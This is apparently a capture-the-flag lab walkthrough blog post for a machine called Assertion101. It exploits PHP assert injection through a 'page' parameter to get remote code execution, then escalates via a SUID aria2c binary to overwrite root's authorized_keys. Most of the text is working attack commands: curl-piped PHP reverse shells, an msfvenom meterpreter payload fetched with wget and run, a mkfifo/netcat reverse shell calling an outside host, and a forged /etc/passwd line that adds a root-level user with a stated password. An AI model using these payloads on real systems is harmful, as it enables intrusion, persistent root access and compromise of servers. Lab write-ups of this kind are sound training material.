---
title: Assertion101
tags:
  - PHP
  - Reverse Shell
  - Authorized_keys
  - Msfvenom
categories: Linux Walkthrough
description: >-
  This machine is exploited by code injection in php assertions.It is escalated
  via misconfigured SUID permissions on '/usr/bin/aria2c'.
date: 2021-02-06 13:27:51
---


# Assertion101

# **Exploitation Guide for Assertion**

## **Summary**

## **Enumeration**

### **Nmap**

We start off by running an `nmap` scan:

```
kali@kali:~$ sudo nmap 192.168.120.218
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 12:06 EDT
Nmap scan report for 192.168.120.218
Host is up (0.041s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

### **Web application**

Let’s explore the web app on port 80.We can see that the menu at the top of the page contains a `page` parameter that seems particularly interesting.

```
<!DOCTYPE html>
<html lang="zxx">
...
<body>
...
            <div class="container">
                <div class="nav-menu">
                    <nav class="mainmenu mobile-menu">
                        <ul>
                            <li class="active"><a href="index.php">Home</a></li>
                            <li><a href="index.php?page=about">About us</a></li>
                            <li><a href="index.php?page=schedule">Schedule</a></li>
                            <li><a href="index.php?page=gallery">Gallery</a></li>
                            <li><a href="index.php?page=blog">Blog</a>
                                <ul class="dropdown">
                                    <li><a href="index.php?page=about">About Us</a></li>
                                    <li><a href="index.php?page=blog-single">Blog Details</a></li>
                                </ul>
                            </li>
                            <li><a href="index.php?page=contact">Contacts</a></li>
                        </ul>
                    </nav>
                </div>
            </div>
...

```

This seems like a good candidate for an LFI attack.

```
kali@kali:~$ curl "http://192.168.120.218/index.php?page=../../../etc/passwd"
Not so easy brother!

```

Looks like we’ll have a harder time than we thought.

## **Exploitation**

### **PHP assertions**

Going from the machine name and the php file extensions, we can guess that the machine is about php assertions.By using Google to search for ways to bypass php assertions, we find similar challenges and we get some suggestions to try.After a couple of tries, we find that the following payload works wonders:

```
page=' and die(system('cat /etc/passwd')) or '

```

Not forgetting to URL encode the spaces, we use `curl` to send it.

```
kali@kali:~$ curl "http://192.168.120.218/index.php?page='+and+die(system('cat+/etc/passwd'))+or+'"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
soz:x:1000:1000:Faisal:/home/soz:/bin/bash
fnx:x:1001:1001::/home/fnx:/bin/sh
fnx:x:1001:1001::/home/fnx:/bin/sh
kali@kali:~$

```

Now that we can inject code, we can download and run a reverse shell payload.

Let’s first start by copying the shell from **/usr/share/webshells/php/php-reverse-shell.php** and editing it with our local machine’s IP and port.

```
kali@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php /tmp/assertion-shell.php
kali@kali:~$ cd /tmp/
kali@kali:/tmp$ grep 'CHANGE THIS' assertion-shell.php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS

kali@kali:/tmp$ vim assertion-shell.php
kali@kali:/tmp$ grep 'CHANGE THIS' assertion-shell.php
$ip = '192.168.118.9';  // CHANGE THIS
$port = 443;       // CHANGE THIS

```

Then start a web server to serve the file.

```
kali@kali:/tmp$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Start our netcat listener.

```
kali@kali:~$ sudo nc -nvlp 443
listening on [any] 443 ...

```

And trigger it.

```
kali@kali:~$ curl "http://192.168.120.218/index.php?page='+and+die(system('curl+http://192.168.118.9/assertion-shell.php|php'))+or+'"
```

We receive the shell on our listener.

```
kali@kali:~$ sudo nc -nvlp 443listening on [any] 443 ...connect to [192.168.118.9] from (UNKNOWN) [192.168.120.218] 36032Linux assertion 4.15.0-74-generic #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 19:00:04 up 2 days, 22:37,  0 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ python -c 'import pty; pty.spawn("/bin/bash")'www-data@assertion:/$
```

## **Escalation**

### **Local Enumeration**

Let’s explore the SUID binaries.

```
www-data@assertion:/$ find / -perm -4000 2>/dev/nullfind / -perm -4000 2>/dev/null/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/snapd/snap-confine/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/bin/at/usr/bin/aria2c/usr/bin/newgrp/usr/bin/newgidmap/usr/bin/newuidmap/usr/bin/passwd/usr/bin/pkexec/usr/bin/sudo/usr/bin/chsh/usr/bin/traceroute6.iputils/usr/bin/gpasswd/usr/bin/chfn/bin/ping/bin/mount/bin/fusermount/bin/su/bin/umount...www-data@assertion:/$
```

Of particular note is the `/usr/bin/aria2c` executable, which is a command line download utility.We can use it to overwrite some important files.For example, we can use it to overwrite the root’s **authorized_keys** file.

Let’s start a web server in our local machine’s *.ssh* folder to get our public key on the remote machine.If you don’t have an SSH key pair created, you can use the `ssh-keygen` command.

```
kali@kali:~$ cd ~/.ssh/kali@kali:~/.ssh$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then use `aria2c` to download it in the **authorized_keys** file.

```
www-data@assertion:/$ /usr/bin/aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.118.9/id_rsa.pub" --allow-overwrite=true<://192.168.118.9/id_rsa.pub" --allow-overwrite=true09/07 19:24:05 [NOTICE] Downloading 1 item(s)09/07 19:24:05 [NOTICE] Download complete: /root/.ssh//authorized_keysDownload Results:gid   |stat|avg speed  |path/URI======+====+===========+=======================================================32eb0a|OK  |   552KiB/s|/root/.ssh//authorized_keysStatus Legend:(OK):download completed.www-data@assertion:/$
```

We can now ssh to the machine as root.

```
kali@kali:~$ ssh root@192.168.120.218...root@assertion:~# iduid=0(root) gid=0(root) groups=0(root)root@assertion:~#
```

Focus：

URL//http://$ip/index.php?page=' and die(show_source('/etc/passwd')) or '

First (Msfvenom Payload)

```
#Create payload**msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf**#Wget into /tmp (Url Encoded)**' and die(system("wget 'http://<ip>/shell.elf' -O /tmp/shell.elf")) or '**#Run while use multi/handler**' and die(system("/tmp/shell.elf")) or '**
```

Second (Curl Php)

```
#Create a php reverse shell (shell.php)

**<?php
    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.142 9001 >/tmp/f');
?>**

#Curl and listen (Url Encoded)

**' and die(system("curlhttp://$IP/shell.php|php")) or '**
```

```
#Copy /etc/passwd by read as a root

**/usr/bin/aria2c -i /etc/passwd**

#Add user with root rigts in the file

**Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash**

#Upload it inside /etc (must be in /etc directory)

**/usr/bin/aria2c -o passwd "http://<ip>/newpasswd" --allow-overwrite=true**

#Get the shell! 
(Pass : Password@973)
su Tom
```
